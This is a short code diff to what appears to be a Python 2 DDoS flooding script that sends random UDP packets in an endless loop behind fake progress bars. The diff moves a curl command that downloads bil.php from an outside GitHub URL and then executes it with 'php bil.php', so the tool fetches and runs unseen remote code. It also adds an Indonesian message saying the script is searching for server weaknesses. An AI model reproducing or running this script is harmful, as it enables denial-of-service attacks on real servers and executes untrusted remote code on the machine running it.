@@ -17,6 +17,10 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
+print "Downloading Source..."
+os.system("curl --url https://raw.githubusercontent.com/bibilgates/r/master/bil.php -o bil.php")
+
+
 os.system("clear")
 
 print
@@ -39,11 +43,11 @@ print "[===============     ] 75%"
 time.sleep(1)
 print "[====================] 100%"
 time.sleep(1)
-print "\n\n[+] DDOS ONE HIT !!!, Attack Starting..."
+print "\n\n[+] DDOS ONE HIT !!!, Attack Starting...\n\n"
 sent = 0
 
-os.system("curl --url https://raw.githubusercontent.com/bibilgates/r/master/bil.php -o bil.php")
 time.sleep(1)
+print "[+] Mencari kelemahan Server, Please wait..."
 os.system("php bil.php")
 
 while True:
